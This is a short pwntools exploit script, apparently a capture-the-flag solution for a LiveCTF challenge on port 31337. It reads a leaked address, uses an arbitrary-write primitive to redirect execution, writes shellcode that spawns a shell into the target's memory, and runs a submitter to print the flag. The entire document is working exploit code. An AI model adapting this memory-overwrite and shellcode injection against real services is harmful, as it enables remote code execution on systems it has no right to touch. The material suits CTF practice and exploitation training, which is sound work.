from pwn import *
import sys

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.binary = '/challenge'
r = remote(HOST, int(PORT))
#r = process("./challenge")
LEAK = u64(r.recv(6).ljust(8, b"\x00"))
log.info("LEAK    : %s" % hex(LEAK))

def write(addr, value):
    r.send(p64(addr))
    r.send(p64(value))

write(LEAK + 0x4330, LEAK + 0x1370)
write(LEAK + 0x4338, LEAK + 0x2000)

r.send(p64(0))


r.send(p32(0))

r.recvuntil(b"Correct!")

sh = asm(shellcraft.sh())
for i in range(len(sh)):
    write(LEAK + 0x2160 + i, int(sh[i]))

r.send(p64(0))


r.sendline(b'./submitter')

flag = r.recvline_contains(b'LiveCTF{')
r.close()
log.info("Flag: %s", flag)
